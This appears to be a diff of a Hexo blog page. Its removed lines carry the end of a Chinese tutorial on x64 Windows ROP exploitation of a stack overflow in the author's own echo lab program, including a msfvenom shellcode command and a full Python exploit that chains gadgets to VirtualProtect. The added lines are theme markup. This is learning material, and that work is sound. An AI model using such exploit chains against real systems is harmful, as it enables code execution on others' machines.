-<p>我们分析 <code>i</code> 的值，首先它由 <code>v7</code> 初始化，来自于 <code>&amp;p_buffer-&gt;_member_buffer[2 * v6 - 2]</code>，<br><code>v6</code> 来自于上面的判断：如果 <code>this-&gt;_buffer._dynamic_buffer._p != 0</code>，<code>v6</code> 等于 <code>this-&gt;_buffer._dynamic_buffer_size &gt;&gt; 2</code>，否则等于 256。总之，<code>i</code> 是一个在 <code>this</code> 指针后面的指针。</p>
-<p>因为 this 指向了初始化为 0 的 <code>.data</code> 节，因此 <code>dword [this+0x30]</code> 等于 0 成立。</p>
-<p>因此，我们只需调用 <code>type_case_integer_parse_into_buffer(&amp;echo + len(shellcode), 0, 任意值)</code> 即可在 <code>r9</code> 留下一个可写的指针。</p>
-<p>在 <code>VirtualProtect</code> 入口处断下（<code>bp 0x140008be0</code>），寄存器的状态：</p>
-<p><img src="/images/regs.png" alt="VirtualProtect 入口处的寄存器状态"></p>
-<p>逐个核对四个参数：<code>rcx = 0x1400ae220</code>（<code>echo</code>）、<code>rdx = 0x1000</code>、<code>r8 = 0x40</code>（<code>PAGE_EXECUTE_READWRITE</code>）、<code>r9 = 0x1400af270</code>。注意 <code>r9</code> 恰好等于 <code>echo + 0x1050</code>，即 <code>this + 0x50</code>——与前面对 <code>type_case_integer_parse_into_buffer</code> 的分析所预测的残留值完全一致，理论与执行在这里闭环。另外 <code>rdi = 0x2020202020202020</code>，正是 <code>ljust</code> 填充的空格（<code>0x20</code>）残留在寄存器里的痕迹。</p>
-<h4 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h4><p>使用 <code>msfvenom</code> 生成 shellcode，弹出计算器：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec CMD=calc -b &#x27;\x00&#x27; &gt; sc.bin</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-p：指定 payload 类型</li>
-<li>-b：排除坏字符 <code>\x00</code></li>
-</ul>
-<p>为什么要排除 <code>\x00</code>：<code>strcpy</code> 复制到第一个 <code>\x00</code> 就会停止，shellcode 中一旦出现 NUL 字节就会被截断，落进 <code>echo</code> 的就不再是完整的 shellcode。同理，exp 中 <code>shellcode.ljust(0x808)</code> 的默认填充字符是空格（<code>0x20</code>）而不是 <code>\x00</code>，保证截断点之前的内容完整到达 <code>echo</code>。而 ROP 链中的 gadget 地址带有 <code>\x00</code>（如 <code>0x0000000140090f36</code> 的高位字节），对 <code>strcpy</code> 来说恰好是天然的截断点，此时 shellcode 早已复制完毕，截断无害。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">0x1000</span>).decode())</span><br><span class="line"></span><br><span class="line">echo = <span class="number">0x00000001400AE220</span></span><br><span class="line"></span><br><span class="line">pop_rcx_cld_ret = <span class="number">0x0000000140090f36</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000140083f9d</span></span><br><span class="line">pop_r8_mov_ecx_dword_rcx_add_rsp_20h_pop_rbp_jmp_1400034b3h = <span class="number">0x0000000140092b5c</span></span><br><span class="line">type_case_integer_parse_into_buffer = <span class="number">0x000000014003D2FC</span> <span class="comment"># [rcx+0x30] = 0</span></span><br><span class="line">VirtualProtect = <span class="number">0x0000000140008BE0</span></span><br><span class="line">add_rsp_10h_ret = <span class="number">0x000000014008b309</span></span><br><span class="line">ret = <span class="number">0x0000000140090f38</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">open</span>(<span class="string">&#x27;sc.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x808</span>)</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQ&#x27;</span>, pop_rcx_cld_ret, echo + <span class="number">0x1000</span>) <span class="comment"># rcx = echo + 0x1000</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQ&#x27;</span>, pop_rdx_ret, <span class="number">0</span>) <span class="comment"># rdx = 0</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, type_case_integer_parse_into_buffer)</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQQQ&#x27;</span>, pop_rcx_cld_ret, <span class="number">0x0000000140000008</span>, pop_r8_mov_ecx_dword_rcx_add_rsp_20h_pop_rbp_jmp_1400034b3h, <span class="number">0x40</span>) <span class="comment"># r8 = PAGE_EXECUTE_READWRITE</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, ret)</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQQQQ&#x27;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQ&#x27;</span>, pop_rcx_cld_ret, echo) <span class="comment"># rcx = echo</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQQ&#x27;</span>, add_rsp_10h_ret, <span class="number">0</span>, <span class="number">0</span>) <span class="comment"># shadow space</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;QQ&#x27;</span>, pop_rdx_ret, <span class="number">0x1000</span>) <span class="comment"># rdx = 0x1000</span></span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, VirtualProtect)</span><br><span class="line">payload += struct.pack(<span class="string">&#x27;&lt;Q&#x27;</span>, echo)</span><br><span class="line"></span><br><span class="line">s.send(payload)</span><br><span class="line">s.recv(<span class="number">0x1000</span>)</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention">x64 calling convention - Microsoft Learn</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/reactos/reactos">ReactOS 源码（<code>_acrt_lock_id</code> &#x2F; <code>_acrt_lock_table</code>）</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a></li>
-<li>完整代码（echo.c、poc.py、exp.py、sc.bin）：<a target="_blank" rel="noopener" href="https://github.com/kobayashi-sana/echo">kobayashi-sana&#x2F;echo</a></li>
-</ul>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/10/07/x64-windows-rop-r9-gadget/" data-id="cuidE90L88IUcefRk_rGA2Ztj" data-title="x64 Windows ROP 初体验：没有 pop r9 gadget 时怎么办" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/09/18/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-09-18T13:55:41.192Z" itemprop="datePublished">2026-09-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/09/18/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/09/18/hello-world/" data-id="cuidlQCHODfh0IGSXShhd5QgZ" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" style="font-size: 10px;">栈溢出</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">October 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">September 2026</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/10/07/x64-windows-rop-r9-gadget/">x64 Windows ROP 初体验：没有 pop r9 gadget 时怎么办</a>
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
           </li>
+          
         
-          <li>
-            <a href="/2026/09/18/hello-world/">Hello World</a>
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
           </li>
         
       </ul>
     </div>
   </div>
+</nav>
 
-  
-</aside>
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-color-toggle-btn"
+               data-label-light="开灯"
+               data-label-dark="关灯">
+            <a href="javascript:;" aria-label="Color Toggle">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-dark" id="mobile-color-toggle-icon"></i>
+                <span id="mobile-color-toggle-label">关灯</span>
+              </div>
+            </a>
+          </div>
         
       </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2026 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
-</footer>
+</div>
 
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="An elegant Material-Design theme for Hexo"></span>
+          
+        </div>
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
     </div>
-    <nav id="mobile-nav">
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      <div class="container nopadding-x-md">
+        <div id="board"
+          style="margin-top: 0">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+<h1 style="display: none">小林Sana</h1>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2026/10/07/x64-windows-rop-r9-gadget/" target="_self">
+          x64 Windows ROP 初体验：没有 pop r9 gadget 时怎么办
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2026/10/07/x64-windows-rop-r9-gadget/" target="_self">
+        <div>
+          本文是我的 Windows ROP 的入门笔记。本文主要讲解了如何在没有开启 GS 和 DYNAMICBASE 保护时如何对具有栈溢出漏洞的程序进行利用。利用使用了两条路径：直接 ROP 和 VirtualProtect 修改内存页为 RWX 执行 shellcode。
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2026-10-07 23:00" pubdate>
+              2026-10-07
+            </time>
+          </div>
+        
+        
+          <div class="post-meta mr-3 d-flex align-items-center">
+            <i class="iconfont icon-category"></i>
+            
+
+<span class="category-chains">
   
-    <a href="/" class="mobile-nav-link">Home</a>
   
-    <a href="/archives" class="mobile-nav-link">Archives</a>
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/" class="category-chain-item">二进制安全</a>
   
-</nav>
+  
+
+      </span>
+    
+  
+</span>
+
+          </div>
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/tags/Windows/">#Windows</a>
+            
+              <a href="/tags/ROP/">#ROP</a>
+            
+              <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
